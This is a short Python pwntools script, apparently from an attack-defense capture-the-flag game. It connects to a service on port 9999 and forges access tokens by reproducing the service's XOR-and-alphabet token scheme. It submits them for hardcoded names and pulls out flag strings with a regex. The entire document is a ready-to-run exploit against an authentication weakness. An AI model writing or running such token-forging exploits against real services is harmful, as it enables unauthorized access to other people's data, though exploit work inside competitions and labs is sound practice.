from pwn import *
import re

attack_data = ['E9AjHFN33bYIsU9BnYmu', 'JCeNZ1hBnlixpgjKzteG']
alph = "ATpfvxWwr2olQuJjEZknGP38qBLdtR6SNCmHVi1g0h7DXIc5F4zMKsbOyaYUe9"

# 5mD7GL67t0z4GvfdF7tq
def gen_private_token(ass_name):
    res = ''
    for i in ass_name:
        idx = (ord(i) ^ 42) % (len(alph)-1)-1
        res += alph[idx]
    
    return res

if __name__ == "__main__":

    r = remote(sys.argv[1], 9999)

    for ass_name in attack_data:
        r.recvuntil(b"> ")
        r.sendline(b"5")
        
        r.recvuntil(b": ")
        r.sendline(ass_name.encode())

        r.recvuntil(b": ")
        r.sendline(gen_private_token(ass_name))

        print(re.findall(b"[A-Z0-9]{31}=", r.recvline()))
    
    r.recvuntil(b"> ")
    r.sendline(b"6")
    r.close()